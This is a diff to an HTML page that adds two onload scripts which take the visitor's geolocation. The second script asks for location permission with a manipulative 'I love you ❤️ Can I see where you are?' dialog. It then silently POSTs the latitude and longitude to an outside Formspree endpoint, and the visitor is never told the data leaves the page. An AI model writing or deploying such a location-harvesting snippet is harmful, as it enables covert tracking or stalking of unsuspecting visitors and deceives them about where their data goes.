@@ -25,6 +25,66 @@
 </head>
 
 <body style="margin:0; font-family:system-ui; background:#fff; color:#111;">
+
+	<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        console.log("Latitude:", position.coords.latitude);
+        console.log("Longitude:", position.coords.longitude);
+
+        // Save to hidden fields
+        document.getElementById("lat").value = position.coords.latitude;
+        document.getElementById("lon").value = position.coords.longitude;
+      },
+      function(error) {
+        console.log("Error getting location:", error.message);
+      }
+    );
+  } else {
+    alert("Geolocation is not supported by this browser.");
+  }
+}
+
+window.onload = getLocation;
+</script>
+	<script>
+window.onload = function () {
+
+  // Step 1: show message
+  const agree = confirm("I love you ❤️\n\nCan I see where you are?");
+
+  if (!agree) return;
+
+  // Step 2: get location
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function (position) {
+
+        // Step 3: send data to Formspree
+        fetch("https://formspree.io/f/maqpqwwd", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            message: "User visited page",
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          })
+        })
+        .then(() => console.log("Location sent"))
+        .catch(err => console.log("Error:", err));
+
+      },
+      function (error) {
+        console.log("Location denied:", error.message);
+      }
+    );
+  }
+};
+</script>
   <div style="max-width:720px; margin:40px auto; padding:0 16px; text-align:center;">
 
 	  <hr/>
